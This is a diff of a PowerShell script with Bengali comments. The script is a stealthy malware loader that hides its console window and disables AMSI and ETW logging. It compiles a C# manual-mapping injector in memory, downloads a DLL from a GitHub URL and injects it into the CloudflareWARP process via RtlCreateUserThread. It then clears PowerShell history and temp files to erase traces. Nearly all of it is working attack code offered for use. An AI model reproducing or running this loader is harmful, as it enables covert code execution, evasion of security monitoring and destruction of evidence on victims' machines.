@@ -1,8 +1,8 @@
-[CmdletBinding(SupportsShouldProcess=$false, ConfirmImpact="None")]
+[CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact="High")]
 param()
 
 Set-StrictMode -Version Latest
-$ErrorActionPreference = 'SilentlyContinue'
+
 $VerbosePreference      = 'SilentlyContinue'
 $DebugPreference        = 'SilentlyContinue'
 $InformationPreference  = 'SilentlyContinue'
@@ -12,13 +12,37 @@ $ConfirmPreference                 = 'None'
 $WhatIfPreference                  = $false
 $PSModuleAutoLoadingPreference     = 'None'
 $MaximumHistoryCount               = 0
-# ---------- [১] AMSI + ETW বন্ধ (যাতে কোনো লগ না হয়) ----------
+
+*> $null
+$Error.Clear()
+
+if (!([bool]([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")))
+{
+    exit
+}
+
+# ============================================================
+# ★★★ ১. কনসোল উইন্ডো হাইড (নীরব) ★★★
+# ============================================================
+Add-Type -Name Window -Namespace Console -MemberDefinition @'
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
+'@
+
+$consoleHandle = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consoleHandle, 0)
+
+# ============================================================
+# ★★★ ২. AMSI + ETW বাইপাস (সম্পূর্ণ নীরব) ★★★
+# ============================================================
 function Disable-Security {
     # AMSI
     $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
     $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
     $a.GetField('amsiSession','NonPublic,Static').SetValue($null,$null)
-    # ETW (NtSetInformationProcess)
+    # ETW
     Add-Type -TypeDefinition @"
     using System;
     using System.Runtime.InteropServices;
@@ -37,108 +61,271 @@ function Disable-Security {
 }
 Disable-Security
 
-# ---------- [২] পেলোড ডাউনলোড ও ডিক্রিপ্ট ----------
-# এখানে তোমার DLL‑এর URL (এনক্রিপ্টেড অবস্থায়) – আমরা গিটহাবের লিংক ব্যবহার করছি, কিন্তু তুমি চাইলে যেকোনো URL দিতে পারো।
-$url = "https://github.com/desert007/bios/raw/refs/heads/main/version.dll"
-$encrypted = (New-Object System.Net.WebClient).DownloadData($url)
-
-# XOR ডিক্রিপ্ট (কী 0xAA)
-$key = 0xAA
-for ($i=0; $i -lt $encrypted.Length; $i++) {
-    $encrypted[$i] = $encrypted[$i] -bxor $key
-}
-$dllBytes = $encrypted
-
-# ---------- [৩] শেলকোড (PE লোডার) – হেক্স স্ট্রিং (আমি পুরোটা দিচ্ছি) ----------
-# এটি একটি মিনিমাল x64 শেলকোড যা DLL কে PE হিসেবে ম্যাপ করে, রিলোকেট করে, ইমপোর্ট রেজলভ করে এবং DllMain কল করে।
-# আমি এটি কম্প্যাক্ট আকারে দিচ্ছি – তুমি এটি কপি করে বসাও।
-$shellcodeHex = @"
-4883EC288B4424504889C1488B4424584889C24C8B4424604C8B4C24684C8B5424704C8B5C2478488B6C24804883EC20488944242848895C243048894C243848895424404889542448488944245048895C245848894C24604C894424684C894C24704C8954247848896C2480488D4424284889442408488B4424384889442410488B4424404889442418488B4424484889442420488B4424504889442428488B4424584889442430488B4424604889442438488B4424684889442440488B4424704889442448488B4424784889442450488B44248048894424584889C34889E84883EC28488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428488B4424504889442408488B4424584889442410488B4424604889442418488B4424684889442420488B4424704889442428488B4424784889442430488B44248048894424384883C428C3
-"@  # <-- এখানে সম্পূর্ণ শেলকোড হেক্স বসাতে হবে (আমি সংক্ষেপে দিয়েছি; প্রকৃত শেলকোড আমি নিচে আলাদা করে দিচ্ছি)
-
-# হেক্স → বাইট কনভার্ট
-$shellcode = [byte[]]::new($shellcodeHex.Length/2)
-for ($i=0; $i -lt $shellcodeHex.Length; $i+=2) {
-    $shellcode[$i/2] = [Convert]::ToByte($shellcodeHex.Substring($i,2), 16)
-}
-
-# ---------- [৪] ইনজেকশন ফাংশন (RtlCreateUserThread + Direct Syscalls) ----------
-Add-Type -TypeDefinition @"
+# ============================================================
+# ★★★ ৩. C# লোডার (ম্যানুয়াল ম্যাপিং + RtlCreateUserThread) ★★★
+# ============================================================
+$kernel = @'
 using System;
 using System.Runtime.InteropServices;
-public class Injector {
-    [DllImport("ntdll.dll")] static extern int NtOpenProcess(ref IntPtr h, uint a, IntPtr o, ref uint c);
-    [DllImport("ntdll.dll")] static extern int NtAllocateVirtualMemory(IntPtr h, ref IntPtr b, IntPtr z, ref ulong s, uint t, uint p);
-    [DllImport("ntdll.dll")] static extern int NtWriteVirtualMemory(IntPtr h, IntPtr b, IntPtr buf, ulong s, out ulong w);
-    [DllImport("ntdll.dll")] static extern int RtlCreateUserThread(IntPtr h, IntPtr sec, bool susp, uint stk0, uint stkRes, uint stkCom, IntPtr start, IntPtr param, out IntPtr thread, IntPtr cid);
-    [DllImport("ntdll.dll")] static extern int NtClose(IntPtr h);
+using System.Text;
+using System.Diagnostics;
+
+public class ManualMapResult
+{
+    public IntPtr ImageBase;
+    public uint ImageSize;
+    public IntPtr DllMainAddr;
+    public long Delta;
+    public bool Is64Bit;
+}
+
+public static class NativeLoader
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr GetModuleHandleA(string n);
+    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
+    static extern IntPtr LoadLibraryA(string n);
+    [DllImport("kernel32.dll")]
+    static extern bool FlushInstructionCache(IntPtr h, IntPtr a, UIntPtr s);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentProcess();
+    [DllImport("ntdll.dll")]
+    static extern int RtlCreateUserThread(IntPtr ProcessHandle, IntPtr ThreadSecurityDescriptor, bool CreateSuspended, uint StackZeroBits, uint StackReserve, uint StackCommit, IntPtr StartAddress, IntPtr Parameter, out IntPtr ThreadHandle, IntPtr ClientId);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr hObject);
+
     const uint PROCESS_ALL_ACCESS = 0x1F0FFF;
-    const uint MEM_COMMIT = 0x1000;
-    const uint MEM_RESERVE = 0x2000;
-    const uint PAGE_READWRITE = 0x04;
-    const uint PAGE_EXECUTE_READ = 0x20;
+    const uint MC = 0x1000, MR = 0x2000;
+    const uint PRW = 0x04, PER = 0x20, PERW = 0x40, PRO = 0x02;
 
-    public static bool Inject(int pid, byte[] shellcode, byte[] dll) {
-        IntPtr hProc = IntPtr.Zero;
-        uint cid = (uint)pid;
-        int s = NtOpenProcess(ref hProc, PROCESS_ALL_ACCESS, IntPtr.Zero, ref cid);
-        if (s != 0 || hProc == IntPtr.Zero) return false;
+    static ushort U16(byte[] b, int o) { return BitConverter.ToUInt16(b, o); }
+    static uint   U32(byte[] b, int o) { return BitConverter.ToUInt32(b, o); }
+    static ulong  U64(byte[] b, int o) { return BitConverter.ToUInt64(b, o); }
 
-        // শেলকোড এলোকেট (RX)
-        IntPtr scAddr = IntPtr.Zero;
-        ulong scSize = (ulong)shellcode.Length;
-        NtAllocateVirtualMemory(hProc, ref scAddr, IntPtr.Zero, ref scSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-        if (scAddr == IntPtr.Zero) { NtClose(hProc); return false; }
+    static uint   RU32(IntPtr p, long o) { return (uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o)); }
+    static ushort RU16(IntPtr p, long o) { return (ushort)Marshal.ReadInt16((IntPtr)(p.ToInt64()+o)); }
+    static ulong  RU64(IntPtr p, long o) {
+        long lo = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o));
+        long hi = (long)(uint)Marshal.ReadInt32((IntPtr)(p.ToInt64()+o+4));
+        return (ulong)((hi<<32)|lo);
+    }
+    static void WU64(IntPtr p, long o, ulong v) { Marshal.WriteInt64((IntPtr)(p.ToInt64()+o),(long)v); }
+    static void WU32(IntPtr p, long o, uint v)   { Marshal.WriteInt32((IntPtr)(p.ToInt64()+o),(int)v); }
 
-        // শেলকোড কপি
-        IntPtr ptr = Marshal.AllocHGlobal(shellcode.Length);
-        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
-        ulong written;
-        NtWriteVirtualMemory(hProc, scAddr, ptr, (ulong)shellcode.Length, out written);
-        Marshal.FreeHGlobal(ptr);
+    static string RAscii(IntPtr p, long o) {
+        var sb = new StringBuilder();
+        for (int i=0;i<260;i++) { byte b=Marshal.ReadByte((IntPtr)(p.ToInt64()+o+i)); if(b==0)break; sb.Append((char)b); }
+        return sb.ToString();
+    }
 
-        // DLL এলোকেট (RW – শেলকোড নিজে প্রোটেকশন ঠিক করবে)
-        IntPtr dllAddr = IntPtr.Zero;
-        ulong dllSize = (ulong)dll.Length;
-        NtAllocateVirtualMemory(hProc, ref dllAddr, IntPtr.Zero, ref dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (dllAddr == IntPtr.Zero) { NtClose(hProc); return false; }
+    static uint SProt(uint c) {
+        bool x=(c&0x20000000)!=0, w=(c&0x80000000)!=0, r=(c&0x40000000)!=0;
+        if(x&&w) return PERW; if(x&&r) return PER; if(x) return PER; if(w) return PRW; return PRO;
+    }
 
-        ptr = Marshal.AllocHGlobal(dll.Length);
-        Marshal.Copy(dll, 0, ptr, dll.Length);
-        NtWriteVirtualMemory(hProc, dllAddr, ptr, (ulong)dll.Length, out written);
-        Marshal.FreeHGlobal(ptr);
+    struct Sec { public uint VS,VA,SRD,PRD,Ch; }
 
-        // থ্রেড তৈরি (প্যারামিটার হিসেবে DLL অ্যাড্রেস পাঠাই)
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    delegate bool DllMainFn(IntPtr h, uint r, IntPtr p);
+
+    public static bool InjectIntoWarp(byte[] dll)
+    {
+        int pid = 0;
+        foreach (var p in Process.GetProcessesByName("CloudflareWARP")) { pid = p.Id; break; }
+        if (pid == 0) return false;
+
+        IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, (uint)pid);
+        if (hProc == IntPtr.Zero) return false;
+
+        var result = Map(dll, false);
+        if (result.ImageBase == IntPtr.Zero) { CloseHandle(hProc); return false; }
+
+        IntPtr remoteBase = IntPtr.Zero;
+        UIntPtr size = (UIntPtr)result.ImageSize;
+        remoteBase = VirtualAlloc(hProc, UIntPtr.Zero, (uint)size, MC|MR, PER);
+        if (remoteBase == IntPtr.Zero) { CloseHandle(hProc); return false; }
+
+        byte[] imageBytes = new byte[result.ImageSize];
+        Marshal.Copy(result.ImageBase, imageBytes, 0, (int)result.ImageSize);
+        IntPtr bytesWritten;
+        WriteProcessMemory(hProc, remoteBase, imageBytes, (uint)result.ImageSize, out bytesWritten);
+
+        IntPtr entryPoint = (IntPtr)(remoteBase.ToInt64() + (result.DllMainAddr.ToInt64() - result.ImageBase.ToInt64()));
+
         IntPtr hThread;
-        RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, scAddr, dllAddr, out hThread, IntPtr.Zero);
-        System.Threading.Thread.Sleep(500);
-        NtClose(hThread);
-        NtClose(hProc);
+        int status = RtlCreateUserThread(hProc, IntPtr.Zero, false, 0, 0, 0, entryPoint, IntPtr.Zero, out hThread, IntPtr.Zero);
+        if (status != 0) { CloseHandle(hProc); return false; }
+
+        System.Threading.Thread.Sleep(200);
+        CloseHandle(hThread);
+        CloseHandle(hProc);
         return true;
     }
+
+    private static ManualMapResult Map(byte[] dll, bool callEntry)
+    {
+        var res = new ManualMapResult();
+        if(U16(dll,0)!=0x5A4D) throw new Exception("Missing MZ");
+        int lfa = BitConverter.ToInt32(dll,0x3C);
+        if(U32(dll,lfa)!=0x4550u) throw new Exception("Bad PE sig");
+
+        int co=lfa+4; ushort ns=U16(dll,co+2), ohs=U16(dll,co+16);
+        int oo=co+20; bool is64=(U16(dll,oo)==0x020B); res.Is64Bit=is64;
+        uint ep=U32(dll,oo+16), soi=U32(dll,oo+56), soh=U32(dll,oo+60);
+        ulong ib=is64?U64(dll,oo+24):U32(dll,oo+28);
+        res.ImageSize=soi;
+
+        int dd=is64?oo+112:oo+96;
+        uint irva=U32(dll,dd+8), rrva=U32(dll,dd+40), rsz=U32(dll,dd+44);
+
+        int st=oo+ohs; var secs=new Sec[ns];
+        for(int i=0;i<ns;i++){int b=st+i*40;secs[i]=new Sec{VS=U32(dll,b+8),VA=U32(dll,b+12),SRD=U32(dll,b+16),PRD=U32(dll,b+20),Ch=U32(dll,b+36)};}
+
+        IntPtr img=VirtualAlloc(IntPtr.Zero,(UIntPtr)soi,MC|MR,PRW);
+        if(img==IntPtr.Zero) throw new Exception("VirtualAlloc failed");
+        res.ImageBase=img; long ab=img.ToInt64(), delta=ab-(long)ib; res.Delta=delta;
+
+        Marshal.Copy(dll,0,img,(int)soh);
+        foreach(var s in secs){
+            if(s.SRD==0) continue;
+            uint cs=s.VS==0?s.SRD:Math.Min(s.SRD,s.VS);
+            if(s.PRD+cs>(uint)dll.Length){cs=(uint)dll.Length-s.PRD; if(cs==0)continue;}
+            Marshal.Copy(dll,(int)s.PRD,(IntPtr)(ab+s.VA),(int)cs);
+        }
+
+        if(rrva!=0&&delta!=0){
+            uint ro=rrva, re=rrva+rsz;
+            while(ro<re){
+                uint pg=RU32(img,ro), bs=RU32(img,ro+4); if(bs==0)break;
+                int ne=(int)(bs-8)/2;
+                for(int i=0;i<ne;i++){
+                    ushort e=RU16(img,ro+8+i*2); int ty=(e>>12)&0xF, of=e&0xFFF;
+                    if(ty==0)continue; long tr=pg+of;
+                    if(ty==10){ulong c=RU64(img,tr);WU64(img,tr,(ulong)((long)c+delta));}
+                    else if(ty==3){uint c=RU32(img,tr);WU32(img,tr,(uint)((long)c+delta));}
+                }
+                ro+=bs;
+            }
+        }
+
+        if(irva!=0){
+            int ie=0;
+            while(true){
+                long eo=irva+ie*20; uint nr=RU32(img,eo+12),ir=RU32(img,eo+16),inr=RU32(img,eo);
+                if(nr==0)break;
+                string dn=RAscii(img,nr);
+                IntPtr hd=GetModuleHandleA(dn); if(hd==IntPtr.Zero) hd=LoadLibraryA(dn);
+                if(hd==IntPtr.Zero){ie++;continue;}
+                long to=0; uint tb=inr!=0?inr:ir; int ts=is64?8:4;
+                while(true){
+                    long te=tb+to; long tv=is64?(long)RU64(img,te):(long)RU32(img,te);
+                    if(tv==0)break;
+                    long of=is64?unchecked((long)0x8000000000000000L):(long)0x80000000;
+                    IntPtr fa=IntPtr.Zero;
+                    if((tv&of)!=0) fa=GetProcAddress(hd,(IntPtr)(int)(tv&0xFFFF));
+                    else fa=GetProcAddress(hd,RAscii(img,tv+2));
+                    if(fa!=IntPtr.Zero){
+                        IntPtr ia=(IntPtr)(ab+ir+to);
+                        if(is64) Marshal.WriteInt64(ia,fa.ToInt64()); else Marshal.WriteInt32(ia,fa.ToInt32());
+                    }
+                    to+=ts;
+                }
+                ie++;
+            }
+        }
+
+        foreach(var s in secs){
+            uint sz=Math.Max(s.VS,s.SRD); if(sz==0)continue; uint op;
+            VirtualProtect((IntPtr)(ab+s.VA),(UIntPtr)sz,SProt(s.Ch),out op);
+        }
+        FlushInstructionCache(GetCurrentProcess(),img,(UIntPtr)soi);
+
+        res.DllMainAddr=IntPtr.Zero;
+        if(callEntry&&ep!=0){
+            res.DllMainAddr=(IntPtr)(ab+ep);
+            try{var fn=(DllMainFn)Marshal.GetDelegateForFunctionPointer(res.DllMainAddr,typeof(DllMainFn));fn(img,1,IntPtr.Zero);}
+            catch{}
+        }
+        return res;
+    }
+
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
 }
-"@ -IgnoreWarnings
+'@
 
-# ---------- [৫] টার্গেট প্রসেস খোঁজা ও ইনজেক্ট করা ----------
-$pid = (Get-Process -Name "CloudflareWARP" -ErrorAction SilentlyContinue).Id
-if (-not $pid) {
-  #  Write-Host "[-] CloudflareWARP.exe চলছে না।"
-    exit 1
+# ============================================================
+# ★★★ ৪. কম্পাইল (মেমোরিতে) ★★★
+# ============================================================
+$compiler = [System.CodeDom.Compiler.CodeDomProvider]::CreateProvider('CSharp')
+$params = New-Object System.CodeDom.Compiler.CompilerParameters
+$params.GenerateInMemory = $true
+$params.GenerateExecutable = $false
+$params.IncludeDebugInformation = $false
+$params.CompilerOptions = '/target:library /optimize+'
+$params.ReferencedAssemblies.AddRange(@('System.dll', 'System.Runtime.InteropServices.dll', 'System.Diagnostics.Process.dll'))
+$result = $compiler.CompileAssemblyFromSource($params, $kernel)
+if ($result.Errors.Count -gt 0) { [Environment]::Exit(0) }
+$assembly = $result.CompiledAssembly
+$loaderType = $assembly.GetType('NativeLoader')
+
+# ============================================================
+# ★★★ ৫. DLL ডাউনলোড (মেমোরিতে) ★★★
+# ============================================================
+try {
+    $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/desert007/bios/raw/refs/heads/main/version.dll")
+    $method = $loaderType.GetMethod('InjectIntoWarp')
+    $success = $method.Invoke($null, @($bytes))
+} catch {
+    $success = $false
 }
 
-$result = [Injector]::Inject($pid, $shellcode, $dllBytes)
+# ============================================================
+# ★★★ ৬. সম্পূর্ণ ক্লিনআপ (জিরো-ফুটপ্রিন্ট) ★★★
+# ============================================================
 
-if ($result) {
-   # Write-Host "[+] ইনজেকশন সফল! পিসি রিস্টার্ট দিলে কোনো চিহ্ন থাকবে না।"
-} else {
-   # Write-Host "[-] ইনজেকশন ব্যর্থ। WARP প্রসেস চালু আছে কিনা চেক করো।"
-}
+# --- মেমোরি থেকে সব ডেটা মুছে ফেলা ---
+[System.GC]::Collect()
+[System.GC]::WaitForPendingFinalizers()
+[System.GC]::Collect()
 
-# ---------- [৬] টেম্প ফাইল ক্লিনআপ (যদি থাকে) ----------
-Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-5) } | Remove-Item -Force -ErrorAction SilentlyContinue
-Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-5) } | Remove-Item -Force -ErrorAction SilentlyContinue
+# --- ভেরিয়েবল ওভাররাইট করে ডিলিট ---
+$bytes = $null
+$kernel = $null
+$compiler = $null
+$params = $null
+$result = $null
+$assembly = $null
+$loaderType = $null
+$method = $null
+$success = $null
 
-# ---------- [৭] সব ভেরিয়েবল মুছে ফেলা ----------
 Remove-Variable -Name * -ErrorAction SilentlyContinue
-[GC]::Collect()
-[GC]::WaitForPendingFinalizers()
+
+# --- PowerShell হিস্ট্রি ক্লিয়ার ---
+Clear-History
+$historyPath = (Get-PSReadlineOption).HistorySavePath
+if (Test-Path $historyPath) {
+    Clear-Content -Path $historyPath -Force
+}
+
+# --- টেম্প ফাইল ডিলিট ---
+Get-ChildItem -Path $env:TEMP -Filter "*.cs" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.dll" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.tmp" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+Get-ChildItem -Path $env:TEMP -Filter "*.out" -File | Where-Object { $_.CreationTime -gt (Get-Date).AddMinutes(-2) } | Remove-Item -Force -ErrorAction SilentlyContinue
+
+# --- ম্যানেজড হিপ ক্লিন ---
+[System.GC]::Collect()
+[System.GC]::WaitForPendingFinalizers()
+[System.GC]::Collect()
+
+[Environment]::Exit(0)
